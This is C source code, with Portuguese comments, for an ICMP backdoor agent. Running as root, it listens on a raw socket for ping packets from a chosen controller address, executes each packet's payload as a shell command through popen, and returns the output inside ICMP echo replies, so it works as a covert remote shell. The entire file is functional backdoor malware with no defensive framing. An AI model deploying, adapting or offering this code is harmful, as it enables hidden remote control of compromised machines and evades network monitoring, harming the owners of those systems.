#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

#define BUFSIZE 1024

unsigned short checksum(void *b, int len); 
FILE *openpipe(char *cmd);

int main(int argc , char *argv[])
{
	int sock , bytesent , bytesrecv , packetsize;
    char packet[BUFSIZE] , *payload , buffer[BUFSIZE];
    FILE *prog;

    struct in_addr myaddr , src_addr;
    struct sockaddr_in dst_addr;
    struct icmphdr *icmp;
    struct iphdr *ip;

    if(argc != 2)
    {
        printf("Use: %s [IP DE ORIGEM]\n", argv[0]);
        return EXIT_SUCCESS;
    }
    else if(getuid() != 0)
    {
        fprintf(stderr , "[INFO] Permissão negada !\nO programa deve ser executado como root.\n");
        return EXIT_FAILURE;
    }

    sock = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);
    if(sock == -1)
    {
        perror("[ERRO] Socket");
        return EXIT_FAILURE;
    }

    printf("(ICMP EXEC/Escravo <- %s)\n", argv[1]);

    while(1)
    {
        printf("Aguardando por pacotes ICMP (localhost <- %s)...\n",argv[1]);

        memset(buffer , 0 , sizeof(buffer));
        memset(packet , 0 , sizeof(packet));
        bytesrecv = bytesent = packetsize = 0;

        bytesrecv = recv(sock , packet , BUFSIZE , 0);
        if(bytesrecv > 0)
        {
            ip = (struct iphdr *)packet;
            if(bytesrecv > sizeof(struct iphdr))
            {
                bytesrecv -= sizeof(struct iphdr);
                icmp = (struct icmphdr *) (ip + 1);

                // Reutilizando cabeçalho IP
                dst_addr.sin_addr.s_addr = ip->saddr;
                dst_addr.sin_family = AF_INET;

                src_addr.s_addr = inet_addr(argv[1]);
                myaddr.s_addr = ip->daddr;

                if(bytesrecv > sizeof(struct icmphdr) && icmp->type == ICMP_ECHO &&
                    src_addr.s_addr == dst_addr.sin_addr.s_addr)
                {
                    bytesrecv -= sizeof(struct icmphdr);
                    payload = (char *)(icmp + 1);
                    payload[bytesrecv] = '\0';

                    icmp->type = ICMP_ECHOREPLY;
            
                    printf("%s -> %s | Tamanho: %li | Comando: %s\n", argv[1],inet_ntoa(myaddr) , bytesrecv  , payload);

                    prog = openpipe(payload);
                    if(prog == NULL) continue;
                    
                    // Enviando a saida do comando
                    while(fgets(buffer , sizeof(buffer) , prog) != NULL)
                    {
                        memcpy((char *) (icmp + 1), buffer, strlen(buffer));
                        packetsize = sizeof(struct icmphdr) + strlen(buffer);
                        icmp->checksum = 0;
                        icmp->checksum = checksum(icmp ,packetsize);
 
                        bytesent = sendto(sock , icmp , packetsize , 0 , (struct sockaddr*)&dst_addr , sizeof(dst_addr));
                        if(bytesent <= 0) perror("[ERRO] Sendto");
                        
                    }
                    pclose(prog);
                }
            }
        }
        else
        {
            perror("[ERRO] Recv");
            break;
        }
    }
    close(sock);
	return EXIT_SUCCESS;
}

// Calcula o checksum do cabeçalho ICMP
unsigned short checksum(void *b, int len) 
{    
    unsigned short *buf = b; 
    unsigned int sum = 0; 
    unsigned short result; 
  
    for ( sum = 0; len > 1; len -= 2 ) sum += *buf++; 
    
    if ( len == 1 ) sum += *(unsigned char*)buf; 
    sum = (sum >> 16) + (sum & 0xFFFF); 
    sum += (sum >> 16); 
    result = ~sum;

    return result; 
}

// Abre um pipe para leitura no comando executado em 'cmd'
FILE *openpipe(char *cmd)
{
    FILE *pipe = popen(cmd , "r");
    return pipe;
}